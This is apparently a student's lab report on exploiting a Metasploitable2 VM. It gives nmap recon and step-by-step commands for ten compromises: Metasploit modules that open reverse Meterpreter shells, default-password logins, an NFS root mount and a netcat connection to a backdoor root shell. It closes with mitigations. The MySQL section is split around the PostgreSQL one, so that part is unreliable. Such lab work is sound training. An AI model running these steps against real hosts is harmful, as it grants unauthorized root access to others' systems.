 Metasploitable2 Exploitation Report

**Name:** Emmanuel Gregory Opoku Owusu-Afriyie
**Index Number:** 4195524
**Date:** 2026-09-21
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework, nmap

---

## Reconnaissance Summary

Ran an nmap scan against the target:

`nmap 192.168.1.3`

Key open ports found:
- 21/tcp - ftp
- 22/tcp - ssh
- 23/tcp - telnet
- 25/tcp - smtp
- 53/tcp - domain
- 80/tcp - http
- 111/tcp - rpcbind
- 139/tcp - netbios-ssn
- 445/tcp - microsoft-ds
- 512/tcp - exec
- 513/tcp - login
- 514/tcp - shell
- 1099/tcp - rmiregistry
- 1524/tcp - ingreslock
- 2049/tcp - nfs
- 2121/tcp - ccproxy-ftp
- 3306/tcp - mysql
- 5432/tcp - postgresql
- 5900/tcp - vnc
- 6000/tcp - X11
- 6667/tcp - irc
- 8009/tcp - ajp13
- 8180/tcp - unknown

**Evidence:** evidence/0-recon.png
---

## Exploit 1: vsftpd 2.3.4 Backdoor

- **Service / Port:** FTP / 21
- **Vulnerability:** vsftpd 2.3.4 backdoor (CVE-2011-2523)
- **Tool Used:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
- **Why This Tool:** This exact vsftpd version has a known, publicly documented backdoor built into that release of the source code. Metasploit ships a purpose-built module for it, so it's the fastest and most reliable way to exploit this specific vulnerability rather than crafting a manual payload.
- **Steps:**
  1. `msfconsole`
  2. `search vsftpd`
  3. `use 1` (exploit/unix/ftp/vsftpd_234_backdoor)
  4. `set RHOSTS 192.168.1.3`
  5. `set LHOST <kali-ip>`
  6. `exploit`
- **Evidence:** evidence/exploit1.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - Reconnaissance: the nmap scan identified the vulnerable vsftpd version.
  - Weaponization: selecting the matching Metasploit module and setting RHOSTS/LHOST paired the vulnerability with a working exploit configuration.
  - Delivery/Exploitation: running `exploit` sent the malicious connection that triggered the backdoor.
  - Installation/C2: a Meterpreter session was established, giving remote control of the target.
  - Actions on Objectives: ran `getuid`/`sysinfo` to confirm root-level access.
- **Outcome / Impact:** Obtained a root-level Meterpreter session on the target.

---

## Exploit 2: Telnet Weak/Default Credentials

- **Service / Port:** Telnet / 23
- **Vulnerability:** Weak/default credentials (msfadmin:msfadmin) with no protection against plaintext credential exposure
- **Tool Used:** telnet (manual, no Metasploit)
- **Why This Tool:** Telnet itself is the vulnerable service — the issue isn't a code exploit but weak authentication, so a plain telnet client is the correct and most direct tool to demonstrate the weakness, rather than a scripted exploit module.
- **Steps:**
  1. `telnet 192.168.1.3`
  2. Login: `msfadmin`
  3. Password: `msfadmin`
  4. `whoami` / `id` to confirm access
- **Evidence:** evidence/exploit2.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - Reconnaissance: nmap identified telnet open on port 23.
  - Delivery: connecting via `telnet` sent the login attempt to the target.
  - Exploitation: the weak credentials succeeded, granting an authenticated shell.
  - Actions on Objectives: ran commands (`whoami`, `id`) inside the shell to confirm and use access.
- **Outcome / Impact:** Obtained an authenticated shell as user `msfadmin` on the target via plaintext telnet.


  ## Exploit 3: NFS Misconfigured Export

- **Service / Port:** NFS / 2049 (via rpcbind / 111)
- **Vulnerability:** NFS share exported with no access restriction (`/ *`), allowing any host to mount the target's entire root filesystem
- **Tool Used:** showmount + mount (manual, no Metasploit)
- **Why This Tool:** The vulnerability is a misconfiguration, not a code flaw — native NFS client tools (`showmount`, `mount`) are the correct way to demonstrate that the export has no restriction, rather than a scripted exploit module.
- **Steps:**
  1. `showmount -e 192.168.1.3` — confirmed `/` exported with `*` (no restriction)
  2. `mkdir /tmp/nfs_mount`
  3. `sudo mount -t nfs 192.168.1.3:/ /tmp/nfs_mount`
  4. `ls -la /tmp/nfs_mount` — confirmed full root filesystem browsable
- **Evidence:** evidence/exploit3.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - Reconnaissance: nmap identified NFS/rpcbind open on ports 111/2049.
  - Delivery: `showmount` and `mount` commands connected to the target's NFS service.
  - Exploitation: the misconfigured export allowed mounting without authentication.
  - Actions on Objectives: browsed the target's root filesystem, demonstrating full read access to system files.
- **Outcome / Impact:** Gained unauthenticated read access to the target's entire filesystem via NFS. (Optional further step: files could be read directly, e.g. `cat /tmp/nfs_mount/etc/passwd`.)


## Exploit 4: Samba usermap_script Command Injection

- **Service / Port:** Samba (SMB) / 139, 445
- **Vulnerability:** Samba "username map script" Command Execution (CVE-2007-2447)
- **Tool Used:** Metasploit — exploit/multi/samba/usermap_script
- **Why This Tool:** The vulnerable Samba version range (3.X-4.X) has a specific configuration flaw allowing shell metacharacters to be injected via the username field. Metasploit's dedicated module automates crafting and delivering this injection reliably, which would otherwise require manually replicating the exact SMB protocol interaction.
- **Steps:**
  1. `nmap -p 139,445 -sV 192.168.1.3` — confirmed Samba smbd 3.X-4.X
  2. `msfconsole` → `search usermap_script`
  3. `use 0` (exploit/multi/samba/usermap_script)
  4. `set RHOSTS 192.168.1.3`
  5. `set LHOST 192.168.1.4`
  6. `exploit`
  7. `whoami` / `id` to confirm access
- **Evidence:** evidence/exploit4.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - Reconnaissance: nmap identified the vulnerable Samba version on 139/445.
  - Weaponization: selecting the usermap_script module and configuring RHOSTS/LHOST paired the vulnerability with a working payload.
  - Delivery/Exploitation: running `exploit` sent the malicious username field, triggering command injection.
  - Installation/C2: a command shell session was opened, giving remote control of the target.
  - Actions on Objectives: ran `whoami`/`id`, confirming root-level access on the target.
- **Outcome / Impact:** Obtained a root-level (uid=0, gid=0) remote command shell on the target via SMB command injection.

  ## Exploit 5: MySQL Root Account with No Password

- **Service / Port:** MySQL / 3306
- **Vulnerability:** MySQL root account configured with no password, allowing unauthenticated remote login
- **Tool Used:** mysql client (manual, no Metasploit)
- **Why This Tool:** The vulnerability is a weak/blank credential configuration, not a code flaw — the native mysql CLI client is the correct and most direct way to demonstrate unauthenticated access, rather than a scripted exploit module.
- **Steps:**
  1. `nmap -p 3306 -sV 192.168.1.3` — confirmed MySQL 5.0.51a-3ubuntu5
  2. `mysql -h 192.168.1.3 -u root --skip-ssl`
  3. Logged in successfully with no password prompt
  4. `show databases;` to confirm access
- **Evidence:** evidence/exploit5.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - Reconnaissance: nmap identified MySQL open on port 3306.
  - Delivery: the mysql client connection sent the login attempt to the target.

 ## Exploit 6: PostgreSQL Default Credentials

- **Service / Port:** PostgreSQL / 5432
- **Vulnerability:** PostgreSQL superuser account (postgres) configured with default/weak password
- **Tool Used:** psql (manual, no Metasploit)
- **Why This Tool:** The vulnerability is weak default credentials, not a code flaw — the native psql client is the correct and most direct way to demonstrate unauthenticated-equivalent access, rather than a scripted exploit module.
- **Steps:**
  1. `nmap -p 5432 -sV 192.168.1.3` — confirmed PostgreSQL 8.3.0-8.3.7
  2. `psql -h 192.168.1.3 -U postgres`
  3. Entered password: `postgres`
  4. `SELECT version();` to confirm access
- **Evidence:** evidence/exploit6.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Exploitation, Actions on Objectives
  - Reconnaissance: nmap identified PostgreSQL open on port 5432.
  - Delivery: the psql client connection sent the login attempt to the target.
  - Exploitation: the default password allowed successful authentication as the superuser.
  - Actions on Objectives: ran `SELECT version();` to confirm and demonstrate the level of access gained.
- **Outcome / Impact:** Obtained superuser-level access to the target's PostgreSQL server using default credentials.
  - Exploitation: the blank root password allowed authentication with no credentials.
  - Actions on Objectives: ran `show databases;` to enumerate accessible data.
- **Outcome / Impact:** Obtained unauthenticated root-level access to the target's MySQL server, exposing all databases.

 
## Exploit 7: Apache Tomcat Manager Default Credentials — Malicious WAR Upload

- **Service / Port:** HTTP (Tomcat) / 8180
- **Vulnerability:** Apache Tomcat Manager application accessible with default credentials (tomcat:tomcat), allowing authenticated upload and deployment of a malicious WAR file
- **Tool Used:** Metasploit — exploit/multi/http/tomcat_mgr_upload
- **Why This Tool:** This vulnerability requires crafting a valid WAR file containing a payload, authenticating to the manager interface, uploading it, and triggering execution — a multi-step process Metasploit automates reliably via a purpose-built module rather than manual scripting.
- **Steps:**
  1. `nmap -p 8180 -sV 192.168.1.3` — confirmed Apache Tomcat/Coyote JSP engine
  2. `msfconsole` → `search tomcat_mgr_upload`
  3. `use 0` (exploit/multi/http/tomcat_mgr_upload)
  4. `set RHOSTS 192.168.1.3`
  5. `set RPORT 8180`
  6. `set HttpUsername tomcat`
  7. `set HttpPassword tomcat`
  8. `set LHOST 192.168.1.4`
  9. `exploit`
  10. `getuid` / `sysinfo` to confirm access
- **Evidence:** evidence/exploit7.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - Reconnaissance: nmap identified Tomcat on port 8180.
  - Weaponization: selecting the module and configuring credentials/target options paired the vulnerability with a working malicious WAR payload.
  - Delivery/Exploitation: uploading and deploying the WAR file to the Tomcat manager triggered code execution on the server.
  - Installation/C2: a Meterpreter session was opened, giving remote control of the target.
  - Actions on Objectives: ran `getuid`/`sysinfo`, confirming access as the `tomcat55` service account and gathering system details.
- **Outcome / Impact:** Obtained a Meterpreter session on the target running as the `tomcat55` service account, via authenticated malicious WAR deployment through Tomcat Manager.

  ## Exploit 8: Ingreslock Backdoor Root Shell

- **Service / Port:** ingreslock / 1524
- **Vulnerability:** Unauthenticated root shell backdoor left open on port 1524 (a legacy artifact commonly planted on this VM to simulate a prior compromise)
- **Tool Used:** netcat (manual, no Metasploit)
- **Why This Tool:** No exploitation is actually required here — the vulnerability is a pre-existing open root shell with zero authentication. A raw netcat connection is the correct and simplest tool to demonstrate this, since no payload or code execution needs to be triggered.
- **Steps:**
  1. `nmap -p 1524 -sV 192.168.1.3` — nmap identified the service directly as "Metasploitable root shell"
  2. `nc 192.168.1.3 1524`
  3. `whoami` / `id` to confirm access
- **Evidence:** evidence/exploit8.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Delivery, Actions on Objectives
  - Reconnaissance: nmap identified the open backdoor shell on port 1524.
  - Delivery: connecting via netcat delivered the connection directly into the waiting shell.
  - Actions on Objectives: ran `whoami`/`id`, confirming immediate root access with no exploitation step required.
- **Outcome / Impact:** Obtained instant, unauthenticated root shell access on the target via a pre-existing backdoor.

  
## Exploit 9: Java RMI Server Insecure Default Configuration

- **Service / Port:** Java RMI / 1099
- **Vulnerability:** Java RMI Registry Insecure Default Configuration — the registry accepts remote class loading, allowing arbitrary code execution
- **Tool Used:** Metasploit — exploit/multi/misc/java_rmi_server
- **Why This Tool:** Exploiting this requires crafting a valid RMI call that tricks the registry into loading and executing a remote Java class — a low-level protocol interaction Metasploit automates reliably via a purpose-built module.
- **Steps:**
  1. `nmap -p 1099 -sV 192.168.1.3` — confirmed GNU Classpath grmiregistry
  2. `msfconsole` → `search java_rmi`
  3. `use 1` (exploit/multi/misc/java_rmi_server)
  4. `set RHOSTS 192.168.1.3`
  5. `set LHOST 192.168.1.4`
  6. `exploit`
  7. `getuid` / `sysinfo` to confirm access
- **Evidence:** evidence/exploit9.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - Reconnaissance: nmap identified the Java RMI registry open on port 1099.
  - Weaponization: selecting the module and configuring RHOSTS/LHOST paired the vulnerability with a working malicious class payload.
  - Delivery/Exploitation: the RMI call sent to the target caused it to load and execute the attacker-supplied class.
  - Installation/C2: a Meterpreter session was opened, giving remote control of the target.
  - Actions on Objectives: ran `getuid`/`sysinfo`, confirming root-level access and gathering system details.
- **Outcome / Impact:** Obtained a root-level Meterpreter session on the target via insecure Java RMI registry configuration.


## Exploit 10: VNC Weak Password Authentication

- **Service / Port:** VNC / 5900
- **Vulnerability:** VNC server configured with a weak, easily guessable password ("password"), allowing unauthorized remote desktop access
- **Tool Used:** Metasploit — auxiliary/scanner/vnc/vnc_login, followed by vncviewer
- **Why This Tool:** This is a credential-brute-force scenario — Metasploit's VNC login scanner automates testing common/weak passwords against the service efficiently, which is the correct approach for identifying weak authentication. The vncviewer client was then used to actually connect and confirm the access visually.
- **Steps:**
  1. `nmap -p 5900 -sV 192.168.1.3` — confirmed VNC protocol 3.3
  2. `msfconsole` → `use auxiliary/scanner/vnc/vnc_login`
  3. `set RHOSTS 192.168.1.3`
  4. `run` — confirmed login successful with password "password"
  5. `vncviewer 192.168.1.3` — connected using the discovered password; authentication succeeded and the session identified the desktop as "root's X desktop (metasploitable:0)"
- **Evidence:** evidence/exploit10.png — shows a successful VNC connection with "Authentication successful" and the desktop name "root's X desktop (metasploitable:0)", confirming both the working weak credential and root-level desktop access
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Actions on Objectives
  - Reconnaissance: nmap identified VNC open on port 5900.
  - Weaponization: selecting the vnc_login scanner and configuring RHOSTS prepared the credential attack.
  - Delivery/Exploitation: running the scan sent the login attempts, and the weak password succeeded; connecting via vncviewer delivered and completed the authenticated session.
  - Actions on Objectives: gained remote desktop access to the target, confirmed as the root user's desktop session.
- **Outcome / Impact:** Obtained unauthorized remote desktop (GUI) access to the target's root account via weak VNC password authentication.


 ## Kill Chain Coverage Summary

| Exploit | Recon | Weaponization | Delivery | Exploitation | Installation | C2 | Actions on Objectives |
|---|---|---|---|---|---|---|---|
| 1. vsftpd 2.3.4 Backdoor | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
| 2. Telnet Weak/Default Credentials | ✔ | | ✔ | ✔ | | | ✔ |
| 3. NFS Misconfigured Export | ✔ | | ✔ | ✔ | | | ✔ |
| 4. Samba usermap_script Command Injection | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
| 5. MySQL Root Account with No Password | ✔ | | ✔ | ✔ | | | ✔ |
| 6. PostgreSQL Default Credentials | ✔ | | ✔ | ✔ | | | ✔ |
| 7. Tomcat Manager Default Credentials (WAR Upload) | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
| 8. Ingreslock Backdoor Root Shell | ✔ | | ✔ | | | | ✔ |
| 9. Java RMI Insecure Default Configuration | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ | ✔ |
| 10. VNC Weak Password Authentication | ✔ | ✔ | ✔ | ✔ | | | ✔ |

---

## Lessons Learned / Mitigations

1. **vsftpd 2.3.4 Backdoor:** Never run software downloaded from unverified/compromised sources; verify package checksums/signatures, and keep FTP daemons patched to current stable releases.
2. **Weak/Default Credentials (Telnet, MySQL, PostgreSQL, Tomcat, VNC):** Enforce strong, unique passwords on all services; disable default accounts or change default credentials immediately after installation; disable plaintext protocols like Telnet in favor of SSH.
3. **NFS Misconfigured Export:** Restrict NFS exports to specific trusted IP ranges instead of using a wildcard (`*`), and apply the principle of least privilege to exported paths.
4. **Samba usermap_script Injection:** Upgrade to a patched Samba version, disable the vulnerable username map script feature if not required, and validate/sanitize all user-supplied input at the protocol level.
5. **Java RMI Insecure Default Config:** Disable remote class loading on RMI registries, or restrict RMI service access to trusted internal networks only via firewall rules. 
